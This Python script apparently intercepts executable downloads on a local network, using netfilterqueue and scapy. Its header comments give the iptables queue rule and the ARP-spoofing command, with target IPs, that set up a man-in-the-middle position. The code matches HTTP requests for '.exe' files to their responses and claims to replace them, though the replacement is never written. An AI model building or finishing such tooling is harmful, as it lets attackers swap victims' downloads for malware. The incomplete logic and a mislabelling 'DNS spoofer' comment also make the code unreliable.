import netfilterqueue
import scapy.all as scapy
import optparse

# Redirect outcome packets to a queue: `iptables -I FORWARD -j NFQUEUE --queue-num 0`
# Run ARP spoofing: python3 ARP_spoofing.py --client 192.168.233.140 --access-point 192.168.233.2
# Run DNS spoofer: python3 file_interceptor.py --port 80

port = None
fake_ip = ""
ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == port:

            # Capture resource downloading requests.
            if "exe" in scapy_packet[scapy.Raw].load.decode():
                print("Found resource downloading request.")

                # We capture the ack of the request.                
                ack_list.append(scapy_packet[scapy.TCP].ack)


        elif scapy_packet[scapy.TCP].sport == port:
            
            # Check sequence of the response.
            if scapy_packet[scapy.TCP].seq in ack_list:
                # Get the response of the resource downloading requests.
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("Found the response. Replacing the response.")
                print(scapy_packet.show())

    else:
        # Not handle another requests.
        pass


    # Forward packets to the target.
    packet.accept()


def main():

    parser = optparse.OptionParser()

    parser.add_option("-p", "--port", dest="port",
                      help="Target port.")


    (options, arguments) = parser.parse_args()

    if not options.port:
        parser.error("Please specify an target port.")

    global port
    port = int(options.port)

    queue = netfilterqueue.NetfilterQueue()

    # Bind to queue number 0.
    queue.bind(0, process_packet)
    queue.run()


if __name__ == "__main__":
    main()
